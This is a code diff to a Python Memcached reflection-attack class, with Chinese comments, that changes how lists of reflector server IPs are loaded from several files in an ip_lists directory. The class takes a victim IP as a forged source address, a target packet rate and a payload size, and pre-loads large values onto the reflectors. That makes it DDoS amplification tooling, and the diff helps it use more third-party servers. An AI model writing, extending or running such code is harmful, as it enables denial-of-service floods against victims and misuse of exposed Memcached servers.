@@ -8,6 +8,7 @@ import time
 import traceback
 from threading import Lock
 from typing import Any, Callable, Dict, List, Optional
+from pathlib import Path
 
 from pymemcache.client.base import Client
 from pymemcache.exceptions import MemcacheError
@@ -37,7 +38,7 @@ class MemcachedTester:
         self.server_keys: Dict[str, str] = {}
         self.keys_lock = Lock()
 
-        self.servers_file = "attack_resources/memcached/resources/servers.txt"
+        self.servers_dir = Path("attack_resources/memcached/resources/ip_lists")
         self.initialized_servers: List[str] = []
         
         # 远程监控（与DNS/NTP保持一致）
@@ -52,7 +53,8 @@ class MemcachedTester:
                  data_size_kb: int = 300, target_pps: int = 5000,
                  spoof_source_ip: Optional[str] = None,
                  spoof_source_port: int = 0,
-                 stats_callback: Optional[Callable[[Dict], None]] = None) -> None:
+                 stats_callback: Optional[Callable[[Dict], None]] = None,
+                 source_files: Optional[List[str]] = None) -> None:
         """
         执行 Memcached 反射攻击测试
         :param target_ip: 受害者 IP（伪造源 IP）
@@ -82,7 +84,7 @@ class MemcachedTester:
 
         try:
             # 加载服务器列表
-            servers = self._load_servers()
+            servers = self._load_servers(source_files=source_files)
             if not servers:
                 logger.error("没有可用的 Memcached 服务器")
                 return
@@ -176,24 +178,39 @@ class MemcachedTester:
         self.is_running = False
         logger.info("正在停止 Memcached 测试...")
 
-    def _load_servers(self) -> List[str]:
-        """加载 Memcached 服务器列表"""
+    def _load_servers(self, source_files: Optional[List[str]] = None) -> List[str]:
+        """加载 Memcached 服务器列表（从 ip_lists/ 目录多文件加载）"""
         servers: List[str] = []
-        if os.path.exists(self.servers_file):
-            try:
-                with open(self.servers_file, "r", encoding="utf-8") as f:
-                    for line in f:
-                        line = line.strip()
-                        if line and not line.startswith("#"):
-                            servers.append(line)
-                logger.info(f"从 {self.servers_file} 加载了 {len(servers)} 个服务器")
-            except Exception as e:
-                logger.error(f"加载服务器列表失败: {str(e)}")
-        else:
-            logger.warning(f"服务器文件不存在: {self.servers_file}")
-            # 添加一些默认服务器（通常为测试用）
+        dir_path = self.servers_dir
+
+        if source_files:
+            for filename in source_files:
+                file_path = dir_path / filename
+                if file_path.exists():
+                    try:
+                        with open(file_path, "r", encoding="utf-8") as f:
+                            for line in f:
+                                line = line.strip()
+                                if line and not line.startswith("#"):
+                                    servers.append(line)
+                    except Exception as e:
+                        logger.warning(f"加载Memcached服务器文件 {filename} 失败: {e}")
+        elif dir_path.exists():
+            for txt_file in sorted(dir_path.glob("*.txt")):
+                try:
+                    with open(txt_file, "r", encoding="utf-8") as f:
+                        for line in f:
+                            line = line.strip()
+                            if line and not line.startswith("#"):
+                                servers.append(line)
+                except Exception as e:
+                    logger.warning(f"加载Memcached服务器文件 {txt_file.name} 失败: {e}")
+            logger.info(f"从 {dir_path} 加载了 {len(servers)} 个服务器")
+
+        if not servers:
+            logger.warning(f"服务器文件目录不存在或无有效IP: {dir_path}")
             servers = ["127.0.0.1"]
-        return servers
+        return list(dict.fromkeys(servers))
 
     def _initialize_servers(self, servers: List[str], data_size_kb: int, target_port: int) -> List[str]:
         """初始化服务器数据（预置大 value）"""
